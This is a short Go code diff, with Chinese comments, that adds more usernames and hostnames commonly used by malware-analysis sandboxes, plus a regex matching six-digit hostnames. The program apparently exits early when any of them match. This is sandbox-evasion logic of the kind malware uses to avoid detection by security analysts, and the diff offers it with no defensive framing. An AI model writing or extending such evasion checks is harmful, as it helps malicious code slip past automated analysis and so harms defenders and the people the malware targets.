@@ -4,6 +4,7 @@ import (
 	"os"
 	"os/user"
 	"path/filepath"
+	"regexp"
 	"strings"
 	"syscall"
 	"unsafe"
@@ -34,11 +35,15 @@ var (
 var (
 	//在此处添加沙箱常见用户名
 	userNames = []string{
-		"John", "Phil",
+		"John", "Phil", "Abby", "george", "katiehall", "kovalev", "WALKER",
 	}
 	//在此处添加沙箱常见主机名
 	hostNames = []string{
-		"John", "Jason",
+		"John", "Jason", "066656", "745773", "WALKER-PC",
+	}
+	//正则匹配主机名
+	hostNamesRex = []string{
+		"\\d\\d\\d\\d\\d\\d",
 	}
 )
 
@@ -169,6 +174,16 @@ func checkHostName(param interface{}) (code int) {
 	}
 	for _, host := range hosts {
 		if strings.Contains(strings.ToLower(hostname), strings.ToLower(host)) {
+			return 0
+		}
+	}
+	for _, reg := range hostNamesRex {
+		reg1 := regexp.MustCompile(reg)
+		if reg1 == nil {
+			println("regexp err")
+			return 0
+		}
+		if reg1.FindAllStringSubmatch(strings.ToLower(hostname), -1) != nil {
 			return 0
 		}
 	}
